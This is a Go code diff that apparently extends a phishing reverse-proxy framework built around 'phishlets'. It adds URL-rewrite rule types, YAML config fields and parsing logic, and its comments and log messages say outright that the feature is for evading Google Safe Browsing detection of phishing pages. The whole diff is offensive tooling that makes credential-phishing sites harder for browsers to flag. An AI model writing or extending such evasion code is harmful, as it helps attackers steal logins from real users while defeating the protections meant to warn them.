@@ -105,6 +105,50 @@ type Intercept struct {
 	mime        string         `mapstructure:"mime"`
 }
 
+// ============================================================================
+// URL REWRITING STRUCTURES (Safe Browsing Evasion)
+// ============================================================================
+
+// RewriteUrlQuery represents a query parameter in the rewritten URL
+type RewriteUrlQuery struct {
+	Key   string
+	Value string
+}
+
+// RewriteUrlRule represents a single URL rewrite rule for Safe Browsing evasion
+type RewriteUrlRule struct {
+	TriggerDomains []string          // Domains that trigger this rule
+	TriggerPaths   []*regexp.Regexp  // Path patterns that trigger this rule
+	RewritePath    string            // The new path to redirect to
+	RewriteQuery   []RewriteUrlQuery // New query parameters to add
+	ExcludeKeys    []string          // Original query params to preserve
+}
+
+// ConfigRewriteUrlQuery for YAML parsing
+type ConfigRewriteUrlQuery struct {
+	Key   *string `mapstructure:"key"`
+	Value *string `mapstructure:"value"`
+}
+
+// ConfigRewriteUrlTrigger for YAML parsing
+type ConfigRewriteUrlTrigger struct {
+	Domains *[]string `mapstructure:"domains"`
+	Paths   *[]string `mapstructure:"paths"`
+}
+
+// ConfigRewriteUrlRewrite for YAML parsing
+type ConfigRewriteUrlRewrite struct {
+	Path        *string                  `mapstructure:"path"`
+	Query       *[]ConfigRewriteUrlQuery `mapstructure:"query"`
+	ExcludeKeys *[]string                `mapstructure:"exclude_keys"`
+}
+
+// ConfigRewriteUrlRule for YAML parsing
+type ConfigRewriteUrlRule struct {
+	Trigger ConfigRewriteUrlTrigger `mapstructure:"trigger"`
+	Rewrite ConfigRewriteUrlRewrite `mapstructure:"rewrite"`
+}
+
 type Phishlet struct {
 	Name             string
 	ParentName       string
@@ -131,6 +175,7 @@ type Phishlet struct {
 	intercept        []Intercept
 	customParams     map[string]string
 	isTemplate       bool
+	rewriteRules     []RewriteUrlRule // URL rewrite rules for Safe Browsing evasion
 }
 
 type ConfigParam struct {
@@ -219,19 +264,20 @@ type ConfigIntercept struct {
 }
 
 type ConfigPhishlet struct {
-	Name        string             `mapstructure:"name"`
-	RedirectUrl string             `mapstructure:"redirect_url"`
-	Params      *[]ConfigParam     `mapstructure:"params"`
-	ProxyHosts  *[]ConfigProxyHost `mapstructure:"proxy_hosts"`
-	SubFilters  *[]ConfigSubFilter `mapstructure:"sub_filters"`
-	AuthTokens  *[]ConfigAuthToken `mapstructure:"auth_tokens"`
-	AuthUrls    []string           `mapstructure:"auth_urls"`
-	Credentials *ConfigCredentials `mapstructure:"credentials"`
-	ForcePosts  *[]ConfigForcePost `mapstructure:"force_post"`
-	LandingPath *[]string          `mapstructure:"landing_path"`
-	LoginItem   *ConfigLogin       `mapstructure:"login"`
-	JsInject    *[]ConfigJsInject  `mapstructure:"js_inject"`
-	Intercept   *[]ConfigIntercept `mapstructure:"intercept"`
+	Name        string                  `mapstructure:"name"`
+	RedirectUrl string                  `mapstructure:"redirect_url"`
+	Params      *[]ConfigParam          `mapstructure:"params"`
+	ProxyHosts  *[]ConfigProxyHost      `mapstructure:"proxy_hosts"`
+	SubFilters  *[]ConfigSubFilter      `mapstructure:"sub_filters"`
+	AuthTokens  *[]ConfigAuthToken      `mapstructure:"auth_tokens"`
+	AuthUrls    []string                `mapstructure:"auth_urls"`
+	Credentials *ConfigCredentials      `mapstructure:"credentials"`
+	ForcePosts  *[]ConfigForcePost      `mapstructure:"force_post"`
+	LandingPath *[]string               `mapstructure:"landing_path"`
+	LoginItem   *ConfigLogin            `mapstructure:"login"`
+	JsInject    *[]ConfigJsInject       `mapstructure:"js_inject"`
+	Intercept   *[]ConfigIntercept      `mapstructure:"intercept"`
+	RewriteUrls *[]ConfigRewriteUrlRule `mapstructure:"rewrite_urls"` // URL rewriting for Safe Browsing evasion
 }
 
 func NewPhishlet(site string, path string, customParams *map[string]string, cfg *Config) (*Phishlet, error) {
@@ -758,6 +804,71 @@ func (p *Phishlet) LoadFromFile(site string, path string, customParams *map[stri
 			p.landing_path[n] = p.paramVal(p.landing_path[n])
 		}
 	}
+
+	// Parse URL rewrite rules for Safe Browsing evasion (optional section)
+	if fp.RewriteUrls != nil {
+		for _, rule := range *fp.RewriteUrls {
+			r := RewriteUrlRule{}
+
+			// Parse trigger domains
+			if rule.Trigger.Domains != nil {
+				for _, d := range *rule.Trigger.Domains {
+					r.TriggerDomains = append(r.TriggerDomains, strings.ToLower(p.paramVal(d)))
+				}
+			} else {
+				log.Warning("rewrite_urls: missing trigger.domains, skipping rule")
+				continue
+			}
+
+			// Parse trigger paths as regex
+			if rule.Trigger.Paths != nil {
+				for _, pathStr := range *rule.Trigger.Paths {
+					re, err := regexp.Compile(p.paramVal(pathStr))
+					if err != nil {
+						log.Warning("rewrite_urls: invalid path regex '%s': %v, skipping", pathStr, err)
+						continue
+					}
+					r.TriggerPaths = append(r.TriggerPaths, re)
+				}
+			} else {
+				log.Warning("rewrite_urls: missing trigger.paths, skipping rule")
+				continue
+			}
+
+			// Parse rewrite path
+			if rule.Rewrite.Path != nil {
+				r.RewritePath = p.paramVal(*rule.Rewrite.Path)
+			} else {
+				log.Warning("rewrite_urls: missing rewrite.path, skipping rule")
+				continue
+			}
+
+			// Parse rewrite query parameters
+			if rule.Rewrite.Query != nil {
+				for _, q := range *rule.Rewrite.Query {
+					if q.Key != nil && q.Value != nil {
+						r.RewriteQuery = append(r.RewriteQuery, RewriteUrlQuery{
+							Key:   p.paramVal(*q.Key),
+							Value: p.paramVal(*q.Value),
+						})
+					}
+				}
+			}
+
+			// Parse exclude keys (original query params to preserve)
+			if rule.Rewrite.ExcludeKeys != nil {
+				for _, k := range *rule.Rewrite.ExcludeKeys {
+					r.ExcludeKeys = append(r.ExcludeKeys, p.paramVal(k))
+				}
+			}
+
+			p.rewriteRules = append(p.rewriteRules, r)
+		}
+		if len(p.rewriteRules) > 0 {
+			log.Info("phishlet [%s]: loaded %d URL rewrite rules for Safe Browsing evasion", site, len(p.rewriteRules))
+		}
+	}
+
 	return nil
 }
 
@@ -1105,4 +1216,9 @@ func (p *Phishlet) paramVal(s string) string {
 		}
 	}
 	return ret
+}
+
+// GetRewriteRules returns the URL rewrite rules for Safe Browsing evasion
+func (p *Phishlet) GetRewriteRules() []RewriteUrlRule {
+	return p.rewriteRules
 }
